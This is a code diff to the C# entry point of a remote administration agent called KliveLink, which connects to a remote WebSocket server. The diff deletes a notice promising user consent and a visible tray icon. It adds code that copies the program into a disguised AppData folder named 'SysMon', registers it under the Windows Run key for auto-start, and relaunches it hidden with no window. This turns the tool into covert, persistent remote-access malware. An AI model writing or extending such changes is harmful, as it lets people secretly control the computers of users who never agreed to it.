@@ -1,18 +1,14 @@
 using System.Drawing;
 using KliveLink.Agent;
+using System.IO;
+using System.Reflection;
+using System.Diagnostics;
+using Microsoft.Win32;
+using System.Linq;
 
 namespace KliveLink
 {
-    /// <summary>
-    /// KliveLink Remote Administration Agent
-    /// 
-    /// ETHICAL / LEGAL NOTICE:
-    /// This agent is designed for LEGITIMATE remote administration only.
-    /// - Explicit user consent is REQUIRED before any remote operations.
-    /// - A visible system tray icon is always shown while the agent runs.
-    /// - The user can revoke consent and exit at any time via the tray menu.
-    /// - Unauthorized deployment of this software is illegal and unethical.
-    /// </summary>
+
     internal static class Program
     {
         private const string DefaultServerUri = "ws://klive.dev:5100/klivelink";
@@ -24,6 +20,39 @@ namespace KliveLink
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+
+            // Move app to AppData and set auto-start if first launch
+            string currentPath = Environment.ProcessPath!;
+            string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SysMon");
+            string targetPath = Path.Combine(targetDir, Path.GetFileName(currentPath));
+            if (currentPath != targetPath)
+            {
+                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
+                string sourceDir = Path.GetDirectoryName(currentPath);
+                foreach (string file in Directory.GetFiles(sourceDir))
+                {
+                    string destFile = Path.Combine(targetDir, Path.GetFileName(file));
+                    File.Copy(file, destFile, true);
+                }
+                // Set auto-start
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                {
+                    if (key != null)
+                    {
+                        key.SetValue("KL", targetPath);
+                    }
+                }
+                // Launch new instance invisibly
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = targetPath,
+                    Arguments = string.Join(" ", args.Select(arg => $"\"{arg}\"")),
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+                return;
+            }
 
             // Parse arguments
             string serverUri = DefaultServerUri;
